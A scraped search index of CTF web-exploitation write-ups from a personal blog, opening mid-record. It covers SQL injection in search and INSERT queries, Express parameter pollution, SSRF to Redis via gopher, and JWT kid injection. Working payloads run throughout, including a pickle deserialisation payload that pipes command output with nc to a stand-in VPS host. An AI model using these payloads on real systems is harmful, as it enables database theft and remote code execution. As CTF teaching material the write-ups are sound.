?search=')union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0Atable_name%0AfRoM%0Ainformation_schema.tables)b%0Ajoin%0A(select%0A3)c)%0A%23\n Table name: secrets\nColumns:   ?search=')union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0Acolumn_name%0Afrom%0Ainformation_schema.columns%0Awhere%0Atable_name=\u0026ldquo;secrets\u0026rdquo;)b%0Ajoin%0A(select%0A3)c)%0A%23\n The interesting Column name : value\nAnd finally :\n ?search=')union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0Avalue%0Afrom%0Asecrets)b%0Ajoin%0A(select%0A3)c)%0A%23\n Damn no flag for us :'( but no problem maybe if we just do load_file(\u0026ldquo;flag.txt\u0026rdquo;) we will have the flag ? unfortunately it wont work, in fact it\u0026rsquo;s not that easy and this is the most juicy part of the task xd i checked the privileges of the current user and the FILE permission was not grantable ! wtf , this result was unpredictable for me so i started digging in mysql file permissions docs until i found this :D\n To limit the location in which files can be read and written, set the secure_file_priv system variable to a specific directory. See Section 5.1.8, “Server System Variables”.\n So probably the author have set a custom location in the global variable secure_file_priv , let\u0026rsquo;s check its value in @@GLOBAL.secure_file_priv\n ?search=')union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0A@@GLOBAL.secure_file_priv)b%0Ajoin%0A(select%0A3)c)%0A%23\n BINGOOO ! so let\u0026rsquo;s have our flag now :\n ?search=')union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0Aload_file(\u0026quot;/var/lib/mysql-files/flag/flag.txt\u0026quot;))b%0Ajoin%0A(select%0A3)c)%0A%23\n FLAG : Securinets{SecuR3_YourSQL!} , I have enjoyed this task and learned a lot about mysql privileges from it , thank you @bibiwars or should i call you @nox xD If you enjoyed the writeup share it with your friends and don\u0026rsquo;t hesitate to ask me on twitter @BelkahlaAhmed1 :D\n","date":1584921600,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1584921600,"objectID":"8fc0821de4f778391335b6e40e77170d","permalink":"https://ahmed-belkahla.me/post/the-after-prequalsecurinetsquals/","publishdate":"2020-03-23T00:00:00Z","relpermalink":"/post/the-after-prequalsecurinetsquals/","section":"post","summary":"The after-Prequal (971pts) (19 Solves) This task was so fun and i learned new things from it , we are given a website with a search functionality and after testing a single quote injection we had an SQL error , so let\u0026rsquo;s start the exploitation of the famous SQL injection :D","tags":null,"title":"The After Prequal - Securinets Quals 2k20","type":"post"},{"authors":null,"categories":null,"content":"Empire Total (1000pts) (7 Solves) This task was really so creative and i had so fun solving it , but i can\u0026rsquo;t deny that it was painful :( after reading the description we can say that we aim to dump the database of the website (maybe SQL injection who knows) and fortunately we have the source code so let\u0026rsquo;s download it and begin our trip xD\nAfter Visiting the website we find a tool based on Virus Total API , understanding the functionality of the website is really necessary for solving the task, we will cover it in details later, but as a first thought we give an ip address to the website and it will shows Virus Total stats about it\nAfter cloning the project here is its structure\n git clone https://github.com/mohamedaymenkarmous/virustotal-api-html\n let\u0026rsquo;s take a look at index.php , since the code is really too long i will only put the important parts, as we can see after some configurations and Recaptcha setting, all the SQL queries are prepared statements so there is no way to perform SQL injection but we can notice the execution of the shell_exec function :D Interesting hmmm\nshell_exec is executing some python script with a scanned ip argument ,maybe manipulating it will give us something useful\n$command = \u0026quot;../VirusTotal.py '$scanned_ip'\u0026quot;; $output = shell_exec($command);  But unfortunately there\u0026rsquo;s too much restriction on our input :( it\u0026rsquo;s impossible to bypass the filter_var here and the JS restrictions (if you can bpass it just tell me xD )\nif(isset($_POST) \u0026amp;\u0026amp; !empty($_POST)){ $scanned_ip=isset($_POST['ip']) \u0026amp;\u0026amp; !empty($_POST['ip']) \u0026amp;\u0026amp; !is_array($_POST['ip']) ? $_POST['ip'] : \u0026quot;\u0026quot;; if(!$scanned_ip){header(\u0026quot;Location: /?invalid_ip\u0026quot;);exit();} if (filter_var($scanned_ip, FILTER_VALIDATE_IP)) { } else {header(\u0026quot;Location: /?invalid_ip\u0026quot;);exit();}  Let\u0026rsquo;s proceed , it seems that the index.php is pretty safe ,let\u0026rsquo;s take a look at the VirusTotal.py script\nOMG :'( 499 lines , that was so discouraging @Emperors :( but we needed that flag to have the 10th place xD anyway after scrolling around and reading the code , we can somehow understand the behaviour of the website, when we enter the ip address it asks the Virus Total API for the results and then there\u0026rsquo;s the persistence functionality that saves the results in the database and then when we enter the same ip address again it will loads the results from the database .\nSo if we can control the results maybe we will have the opportunity to perform an SQL injection ? I got stuck in this part for a long time and after the help of the admin ( Thank you @Emperors \u0026lt;3 ) i found something interesting :D\nbefore we proceed here\u0026rsquo;s a vulnerable function to SQL injection that saves the results of urls section in the database (line 417 in VirusTotal.py)\ndef persistURLs(self,selected_ips,ip_report_filtered): attr=\u0026quot;detected_urls\u0026quot; table_name=\u0026quot;vt_scanned_urls_table\u0026quot; newAttr=self.AttrSubstitution[attr] if attr in self.AttrSubstitution else attr selected_urls=self.findPersistedIP(selected_ips[0]['id'],table_name) selected_urls_filtered=[] for selected_url in selected_urls: selected_urls_filtered.append(selected_url['url']) if newAttr in ip_report_filtered: for url in ip_report_filtered[newAttr]: print(url['URL']) if url['URL'] not in selected_urls_filtered: try: self.CursorRW.execute(\u0026quot;INSERT INTO \u0026quot;+table_name+\u0026quot; (ip_id,url,detections,scanned_time) VALUES ('\u0026quot;+str(selected_ips[0]['id'])+\u0026quot;','\u0026quot;+url['URL']+\u0026quot;','\u0026quot;+url['Detections']+\u0026quot;','\u0026quot;+url['Scanned']+\u0026quot;')\u0026quot;) self.DBRW.commit() self.resetSQL() except Exception as e: print(\u0026quot;INSERT INTO \u0026quot;+table_name+\u0026quot; (ip_id,url,detections,scanned_time) VALUES ('\u0026quot;+str(selected_ips[0]['id'])+\u0026quot;','\u0026quot;+url['URL']+\u0026quot;','\u0026quot;+url['Detections']+\u0026quot;','\u0026quot;+url['Scanned']+\u0026quot;')\u0026quot;) print(\u0026quot;EXCEPTION: \u0026quot;,e) self.resetSQL()  Exploitation So the idea is that if we go to VirusTotal website (https://www.virustotal.com/) and scan a url ,and then go back to our challenge website and scan the url\u0026rsquo;s ip we will find that the url we scanned in VirusTotal website will appear , it\u0026rsquo;s pretty confusing i know so let\u0026rsquo;s have an example\n We go to Virus Total website and scan for any url for example :( in my case i launched a web server on my VPS and used it here )   http://100.26.206.184/?u=Just testing for the writeup :p\n Now we go back to the challenge website and scan the ip address  Yeeees ! it\u0026rsquo;s appearing in the results so we now have the control over these values in the urls section of the results.\nNow here is our scenario , if we look to the vulnerable function persistURLs in VirusTotal.py we can notice the injection in this query (line 430)\n INSERT INTO \u0026ldquo;+table_name+\u0026rdquo; (ip_id,url,detections,scanned_time) VALUES ('\u0026quot;+str(selected_ips[0][\u0026lsquo;id\u0026rsquo;])+\u0026quot;','\u0026quot;+url[\u0026lsquo;URL\u0026rsquo;]+\u0026quot;','\u0026quot;+url[\u0026lsquo;Detections\u0026rsquo;]+\u0026quot;','\u0026quot;+url[\u0026lsquo;Scanned\u0026rsquo;]+\u0026quot;')\n We have control over the url[\u0026lsquo;URL\u0026rsquo;] parameter (the url we scan in VirusTotal Website) so it\u0026rsquo;s now an SQL injection in INSERT INTO values, but we have some constraints :\n The url encoding %20 that will be interpreted with the SQL query so we have to find another way in our payload instead of white spaces which is a well known bypass: /**/ The second thing faced me when i was solving the challenge , we can\u0026rsquo;t use \u0026ndash; - to equilibrate the SQL query so we will have to find a solution to equilibrate it  In order to test the injection locally i have created this small script that connects to my local DB and executes the same query, you can find it  HERE\nFinally I opted to this solution, here is the URL we will scan :\n http://100.26.206.184/?u=',(select/**/1),(select/**/2)),(\u0026lsquo;102\u0026rsquo;,\u0026lsquo;a\n The complete SQL query that will be executed is :\n INSERT INTO detected_urls (ip_id,url,detections,scanned_time) VALUES (\u0026lsquo;2\u0026rsquo;,\u0026lsquo;100.26.206.184/?u=\u0026rsquo;,(select 1),(select 2)),(\u0026lsquo;102\u0026rsquo;,\u0026lsquo;a\u0026rsquo;,\u0026lsquo;15\u0026rsquo;,\u0026lsquo;yes\u0026rsquo;)\n Let\u0026rsquo;s try it now , we first scan it in VirusTotal :\nAnd now let\u0026rsquo;s scan the IP in the challenge website :\nIt\u0026rsquo;s fetched successfully, let\u0026rsquo;s scan the ip another time now to check if our injection succeeded or not, we must see 1,2 in the output :\nBingo ! our injection worked , we only have to dump the entire Database now and repeat the same procedure:\n Dump DB names :   http://100.26.206.184/?u=\u0026rsquo;,(select/**/gRoUp_cOncaT(0x7c,schema_name,0x7c)/**/fRoM/**/information_schema.schemata),(select/**/2)),(\u0026lsquo;102\u0026rsquo;,\u0026lsquo;a\n DBName : MySecretDatabase\nDump Tables and Columns :   http://100.26.206.184/?u=\u0026rsquo;,(select/**/gRoUp_cOncaT(0x7c,table_name,0x7c)/**/fRoM/**/information_schema.tables),(select/**/2)),(\u0026lsquo;102\u0026rsquo;,\u0026lsquo;a\n  http://100.26.206.184/?u=\u0026rsquo;,(select/**/gRoUp_cOncaT(0x7c,column_name,0x7c)/**/fRoM/**/information_schema.columns),(select/**/2)),(\u0026lsquo;103\u0026rsquo;,\u0026lsquo;a\n Table Name : SecretTable \u0026amp; Column Name : secret_value\nAnd finally let\u0026rsquo;s have our beloved flag :   http://100.26.206.184/?u=\u0026rsquo;,(select/**/group_concat(0x7c,secret_value,0x7c)/**/fRoM/**/MySecretDatabase.SecretTable),(select/**/2)),(\u0026lsquo;109\u0026rsquo;,\u0026lsquo;a\n Yees We did it , FLAG : Securinets{EmpireTotal_Pwn3D_fr0m_Th3_0th3r_S1de}\nI have really liked the idea of the challenge, it\u0026rsquo;s really creative , i want to thank Securinets technical team for these fun tasks and awesome CTF and of course the author @TheEmperors.\nI hope you liked the writeup if you have any questions don\u0026rsquo;t hesitate to contact me Twitter : @BelkahlaAhmed1 , finally i can sleep in peace after these 24 hours xd\n","date":1584748800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1584748800,"objectID":"5442b7b56fe4b087fc22ba29c9195065","permalink":"https://ahmed-belkahla.me/post/empire-total-securinetsquals20/","publishdate":"2020-03-21T00:00:00Z","relpermalink":"/post/empire-total-securinetsquals20/","section":"post","summary":"Empire Total (1000pts) (7 Solves) This task was really so creative and i had so fun solving it , but i can\u0026rsquo;t deny that it was painful :( after reading the description we can say that we aim to dump the database of the website (maybe SQL injection who knows) and fortunately we have the source code so let\u0026rsquo;s download it and begin our trip xD","tags":null,"title":"Empire Total - Securinets Quals 20","type":"post"},{"authors":null,"categories":null,"content":"A Peculiar Query (180pts) (73 Solves) I really liked this web task , we are given this web page that have a search functionality\nAnd we can read the source code\nconst express = require(\u0026quot;express\u0026quot;); const rateLimit = require(\u0026quot;express-rate-limit\u0026quot;); const app = express(); const { Pool, Client } = require(\u0026quot;pg\u0026quot;); const port = process.env.PORT || 9090; const path = require(\u0026quot;path\u0026quot;); const client = new Client({ user: process.env.DBUSER, host: process.env.DBHOST, database: process.env.DBNAME, password: process.env.DBPASS, port: process.env.DBPORT }); async function query(q) { const ret = await client.query(`SELECT name FROM Criminals WHERE name ILIKE '${q}%';`); return ret; } app.set(\u0026quot;view engine\u0026quot;, \u0026quot;ejs\u0026quot;); app.use(express.static(\u0026quot;public\u0026quot;)); app.get(\u0026quot;/src\u0026quot;, (req, res) =\u0026gt; { res.sendFile(path.join(__dirname, \u0026quot;index.js\u0026quot;)); }); app.get(\u0026quot;/\u0026quot;, async (req, res) =\u0026gt; { if (req.query.q) { try { let q = req.query.q; // no more table dropping for you let censored = false; for (let i = 0; i \u0026lt; q.length; i ++) { if (censored || \u0026quot;'-\\\u0026quot;.\u0026quot;.split``.some(v =\u0026gt; v == q[i])) { censored = true; q = q.slice(0, i) + \u0026quot;*\u0026quot; + q.slice(i + 1, q.length); } } q = q.substring(0, 80); const result = await query(q); res.render(\u0026quot;home\u0026quot;, {results: result.rows, err: \u0026quot;\u0026quot;}); } catch (err) { console.log(err); res.status(500); res.render(\u0026quot;home\u0026quot;, {results: [], err: \u0026quot;aight wtf stop breaking things\u0026quot;}); } } else { res.render(\u0026quot;home\u0026quot;, {results: [], err: \u0026quot;\u0026quot;}); } }); app.listen(port, function() { client.connect(); console.log(\u0026quot;App listening on port \u0026quot; + port); });  Overview It\u0026rsquo;s pretty obvious that we have an sql injection here ( we are concatenating the user input )\n const ret = await client.query(SELECT name FROM Criminals WHERE name ILIKE '${q}%';);\n But as we can see some filters are here :'( these characters are filtered : [',-,\u0026quot;,.] , after some tries i have figured that it will be impossible to bypass them so i started looking to some JS tricks. As we can see the filter function is looping over our input and checks if there are some prohibited characters and then it will replace them with \u0026ldquo;*\u0026rdquo; , For example if we type\n hello\u0026quot;or 1=1 \u0026ndash; -\n Our input will be changed to :\n hello************\n let q = req.query.q; let censored = false; for (let i = 0; i \u0026lt; q.length; i ++) { if (censored || \u0026quot;'-\\\u0026quot;.\u0026quot;.split``.some(v =\u0026gt; v == q[i])) { censored = true; q = q.slice(0, i) + \u0026quot;*\u0026quot; + q.slice(i + 1, q.length); } }  And finally it\u0026rsquo;s using substring function to limit our input\u0026rsquo;s length to 80 characters\nq = q.substring(0, 80); const result = await query(q); res.render(\u0026quot;home\u0026quot;, {results: result.rows, err: \u0026quot;\u0026quot;});  Hmmm everything seems okay nah ? but it\u0026rsquo;s a ctf web task we have to find some vulnerabilities ! let\u0026rsquo;s pass to how i did to solve it now, enough boring things\nExploitation The first thing i thinked about was http parameter pollution in express (read about it  HERE if you want ) ,briefly when we enter a get parameter multiple times express has a weird interpretation , it will process this parameter as an array for example here, if we pass this in the query :\n ?q=hello\u0026amp;q=allo\u0026amp;q=fword\n req.query.q will be parsed as an array [\u0026ldquo;hello\u0026rdquo;,\u0026ldquo;allo\u0026rdquo;,\u0026ldquo;fword\u0026rdquo;] , so if we go further when we will be iterating of q variable we will be comparing each array field with the filters for example, if we pass this query :\n q=\u0026ldquo;or 1=1 \u0026ndash; -\u0026amp;q=fword\n we will firstly compare \u0026ldquo;or 1=1 \u0026ndash; - and then the second field fword with these filtered chars [',-,\u0026rdquo;,.] , they are not equal ! , Youupi we can get our flag now as we passed the check .\nUnfortunately , it\u0026rsquo;s not that easy ,have you forgot the substring function ? an array has not a built in substring function so when we reach the substring part this will raise an error so we won\u0026rsquo;t execute the sql query :/ Javascript weird behaviour will save us this time ! if we do []+[] the result is a string , the sum of two arrays is a string so if we enter a \u0026quot; in one query parameter we will enter this part\ncensored = true; q = q.slice(0, i) + \u0026quot;*\u0026quot; + q.slice(i + 1, q.length);  and arrays have a built in slice function so the result of []+\u0026quot;*\u0026quot;+[] will be a string , we can now enter our payload with q=' in the end to ensure that our array will be a string when it reaches the substring part For example :\n q=\u0026lsquo;or 1=1 \u0026ndash; -\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=\u0026rsquo;\n will let us pass !\nFILTERS BYPASSED SUCCESSFULLY\nTo test the number of q parameters and debug the app , i changed a little bit the source code and hosted the web app locally , you can find the modified source code  HERE if you want to test :D\nThe next part is pretty classic , a simple sql injection , we will first dump the columns name (we know the table name from the source code)\n q=%27union%20SELECT%20column_name%20FROM%20information_schema.columns%20\u0026ndash;%20-\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=%27\n and finally we find a column named crime so our final payload will be :\n HOST/?q=%27union%20SELECT%20crime%20FROM%20criminals%20\u0026ndash;%20-\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=%27\n And Congratulations ! I want to thank the organizers for this great CTF and fun tasks , i have really enjoyed participating\n","date":1584576000,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1584576000,"objectID":"69529b563e3d5c941234b067b82bbb69","permalink":"https://ahmed-belkahla.me/post/angstromctf20/","publishdate":"2020-03-19T00:00:00Z","relpermalink":"/post/angstromctf20/","section":"post","summary":"A Peculiar Query (180pts) (73 Solves) I really liked this web task , we are given this web page that have a search functionality\nAnd we can read the source code","tags":null,"title":"ångstrom CTF 2k20 - Web Exploitation","type":"post"},{"authors":null,"categories":null,"content":"Shinobis World (1000pts) (1 Solves) Hello guys again , in this task we are give the Settings.py of a django Web application , we can notice that the website is using caching with redis that is listening on port 6379 locally !\nOur first impression, we see an url fetcher that is curling websites which will be probably some SSRF , we try the usual payloads and we find that file ,localhost and 127.0.0.1 are filtered so we can use 127.0.1 and maybe http or gopher protocol , firstly let\u0026rsquo;s think , as we said we had a redis instance that is running on localhost , so may be using the ssrf we can interact with it\nin fact you can use gopher protocol to interact with redis :\n gopher://127.0.1:6379/_RedisCommandHERE\n for example to list all keys:\n  gopher://127.0.1:6379/_keys%20*\n  if we refresh the shinobis web page and then list all keys we can see some new keys that are set :\n :1:views.decorators.cache.cache_page..GET.a906279c6f1b8c76747a8ba71e866d8c.d41d8cd98f00b204e9800998ecf8427e.en-us.UTC\n :1:views.decorators.cache.cache_header..a906279c6f1b8c76747a8ba71e866d8c.en-us.UTC\n  If you read the Django Manual you will find that the caching system in django is a little bit different , first of all django will serialize the header and the rest of the page using pickle then it will cache them in the memory\nSo the idea is to forge our payload using pickle and the set the default key of django (:1:views.decorators.cache.cache_page..GET.a906279c6f1b8c76747a8ba71e866d8c.d41d8cd98f00b204e9800998ecf8427e.en-us.UTC) with our payload , here is what will happen chronologically :\n Django will try to load the page so firstly he will check if the :1:views.decorators.cache.cache_page..GET.a906279c6f1b8c76747a8ba71e866d8c.d41d8cd98f00b204e9800998ecf8427e.en-us.UTC key is set if the key is set he will unpickle the data stored there and load the page using this content Our payload will be executed then Bingo we will have the flag :D  Final Payload :\n gopher://127.0.1:6379/aset%20:1:views.decorators.cache.cache_page..GET.a906279c6f1b8c76747a8ba71e866d8c.d41d8cd98f00b204e9800998ecf8427e.en-us.UTC%20\u0026quot;cposix\\nsystem\\np0\\n(S\u0026rsquo;ls|nc YourVPSIP 1234'\\np1\\ntp2\\nRp3\\n.\u0026quot; This Payload will execute ls command and send it to our vps (don\u0026rsquo;t forget to refresh the Shinobis page because it\u0026rsquo;s the page that is being cached)\n Note: You can find the source code of this task in the source code repo of my github repo\nConclusion\nI hope that you liked the challenge , i tried to combine the SSRF with this default feature of django that can be used maliciously , it can be applied with any caching system (Memcached or Redis ..) If you have any questions dont forget to contact me and if you liked this writeup please star this repo :D\n","date":1579737600,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1579737600,"objectID":"0115426ad15f4b3eb137669dff5b0d89","permalink":"https://ahmed-belkahla.me/post/shinobisworld/","publishdate":"2020-01-23T00:00:00Z","relpermalink":"/post/shinobisworld/","section":"post","summary":"Shinobis World (1000pts) (1 Solves) Hello guys again , in this task we are give the Settings.py of a django Web application , we can notice that the website is using caching with redis that is listening on port 6379 locally !","tags":null,"title":"Shinobis World - Web Exploitation NCSC 2.0 CTF","type":"post"},{"authors":null,"categories":null,"content":"JWT In a new way (1000pts) (0 Solves) And finally i\u0026rsquo;m writing a writeup for this task xD i published this task in Securinets Mini CTF and NCSC2.0_CTF but unfortunately it had 0 solves (in fact no one managed to pass the first step) , it took me a lot of time to prepare this task so i hope you enjoy it :D However bring your coffee cup and let\u0026rsquo;s begin the road . This Task has 3 steps , the first one is bypassing JWT token with a custom attack (not the regular ones) actually using an SQL injection in one of the token parameters , then we will have to exploit an ssrf to crypt the content of flag file (too much filters here haha)\n1st Step : JWT Bypass After visiting the link we have a simple web page with a sign in and sign up page ;\nSo after registering with random creds and signing in we check the cookies and as the task name refers we find a jwt token\nWe go as usual to the famous jwt.io to see the content of the token\nWe can try all the regular attacks but nothing will work , the kid value in the header is suspicious as we dont see it always in JWT tokens so after some googling we can conclude that the kid parameter is used when the jwt token is signed using multiple keys , each kid value refers to a different key (Example: kid:1 refers for ex to the key \u0026lsquo;blabla\u0026rsquo; and when we have kid:2 we are using a different key to sign the jwt token) Hmmm things are getting interesting here, we can suppose that the keys are fetched from a database maybe , let\u0026rsquo;s read again the description , we can notice a hint for SQL so maybe we have an SQL injection ? Let\u0026rsquo;s try to trigger an error by injecting this in the kid parameter\n ' UNION SELECT 2 \u0026ndash; -\n But Before you will have to fully understand how JWT tokens are forged, because there is no libraries that include the kid implementation so let\u0026rsquo;s take some notes here :\nAs we all know JWT token have 3 sections : Header + Payload + signature\nHeader : typically consists of two parts: the type of the token, which is JWT, and the signing algorithm being used, such as HMAC SHA256 or RSA but here we have also the kid part which is optional\nPayload : it contains statements about an entity (typically, the user) and additional data .\nSignature : Simply if we are using HS256 the sig is : Signature= HMACSHA256(BASE64URL(HEADER)+'.'+BASE64URL(PAYLOAD))\nBe careful it\u0026rsquo;s BASE64URL not a regular BASE64 you can read about it here : LINK\nNOTE: you can use the php function hash_hmac(\u0026lsquo;sha256\u0026rsquo;, $msg, $key, true) to sign the token\nso after forging the JWT token and replacing it we got this page !\nToken i used (i have used a random key for the signature) :\n eyJ0eXAiOiAiSldUIiwiYWxnIjogIkhTMjU2Iiwia2lkIjogIiAnIFVOSU9OIFNFTEVDVCAyIC0tIC0ifQ.eyJ1c2VyIjogImFhIiwidHlwZSI6ICJhZG1pbiJ9.xXh6UOMjm0YtgmiIsL6VExdDCLiUhIEF28kjv8UzWpo\n Hmmmmmmm an interesting message i think we are on a good path , now let\u0026rsquo;s think wisely , we have two paths now , the first one is to try to leak the keys with a blind SQL injection which is really painful especially if we face some filters and the second one which we will follow.\nWe will force the jwt token to use a key we provide to sign the token ; after some regular SQL injection tests we found that we had two columns which is expected (a column for the id and a column for the key ) we use this payload in the kid parameter\n \u0026lsquo;UNION SELECT 1,\u0026lsquo;kahla\u0026rsquo; \u0026ndash; -\n Thus the key will be forced to be kahla BUT we still get the annoying page \u0026ldquo;Here is your flag ! Just kidding \u0026quot; :'( (What an evil author 3:) )\nI think there are some filters here :'( Let\u0026rsquo;s try this payload in the kid parameter :\n \u0026lsquo;UNiOn SElEcT 1,\u0026lsquo;abc\u0026rsquo; \u0026ndash; -\n The final token used:\neyJ0eXAiOiAiSldUIiwiYWxnIjogIkhTMjU2Iiwia2lkIjogIidVTmlPbiBTRWxFY1QgMSwnYWJjJyAtLSAtIn0.eyJ1c2VyIjogIiIsInR5cGUiOiAiYWRtaW4ifQ.3cOHXg1U7Mj_I3ag37oeg5KWJYA11T74bbD4NrcMC8A\nAnd yeeeeeeees we did it ! but WTF where is our flag ! we need to finish this step before\n2nd Step : SSRF + Decrypt It\u0026rsquo;s a web application that crypts a txt file and after some tries i figured that it only accepts urls that finish with .txt extension\nWe can all notice that it\u0026rsquo;s an ssrf but:\n file protocol is filtered we only can use http or https protocol localhost,127.0.0.1,127.0.1,the octal form of ip , and even ipv6 localhost address are filtered  Finally i used this payload that bypassed all the filters below :\n http://0x7f000001/flag.txt\n I used the hexadecimal format of local ip address :D\nAnd Bingo we have our flag but it\u0026rsquo;s encrypted If you check the source code you find a hint that leads us to visit robots.txt file and BINGO we find the crypting function\npublic static function cryptage($content){ $i=0; $words=array('kAHl4','$ecUriNets','Cha1m4','th4meUr','WhiT3HacK3Rs','Ani$Bo$$CoUldNtS0Lv31t'); $crypted=\u0026quot;\u0026quot;; for($i=0;$i\u0026lt;strlen($content);$i-=-pow(0,0)) { $ser=serialize(array($words[$i % 6],'securinets')); $key=intval(explode(\u0026quot;:\u0026quot;,explode(\u0026quot;;\u0026quot;,$ser)[1])[1]); $crypted=$crypted.chr(ord($content[$i])+$key) ; } return $crypted;  But it\u0026rsquo;s somehow a little bit obfuscated , however after digging here is the decrypt function\nfunction decryptage($content){ $i=0; $words=array('kAHl4','$ecUriNets','Cha1m4','th4meUr','WhiT3HacK3Rs','Ani$Bo$$CoUldNtS0Lv31t'); $decrypted=\u0026quot;\u0026quot;; for($i=0;$i\u0026lt;strlen($content);$i-=-pow(0,0)) { $ser=serialize(array($words[$i % 6],'securinets')); $key=intval(explode(\u0026quot;:\u0026quot;,explode(\u0026quot;;\u0026quot;,$ser)[1])[1]); $decrypted=$decrypted.chr(ord($content[$i])-$key) ; } return $decrypted ; } $cont=\u0026quot;eG9pfH5/c296eu+/vW01On1mP++/vTh4ZVt0SWRLe3tU77+9d2lJO1rvv71kXTZzYklkXk44MDcm77+9EA==\u0026quot; ; $con=base64_decode($cont); $res= decryptage($con); echo $res;  Executing this will give you the flag but with some unreadable characters (because of the non printable characters after crypting it) that\u0026rsquo;s why we can use curl in our cli and extract the crypted flag and save it or simply we can use a little python script that automates this and FINALLY we got The flag :\n securinets{W00w_3v3n_Th3_AutHor_C4Nt_S0lV3_TH1$!!}\n *** Conclusion ***\nI hope you liked this task , it took me 4 continuous days of hard work to implement this idea ( i had to write a big part of jwt generator ) you can find the source code in the same directory ! Anyways dont forget to star me and if you faced any problems please contact me!\n","date":1579651200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1579651200,"objectID":"90f4ce3510f102d8442ff6396cd36b56","permalink":"https://ahmed-belkahla.me/post/jwt-in-a-new-way/","publishdate":"2020-01-22T00:00:00Z","relpermalink":"/post/jwt-in-a-new-way/","section":"post","summary":"JWT In a new way (1000pts) (0 Solves) And finally i\u0026rsquo;m writing a writeup for this task xD i published this task in Securinets Mini CTF and NCSC2.0_CTF but unfortunately it had 0 solves (in fact no one managed to pass the first step) , it took me a lot of time to prepare this task so i 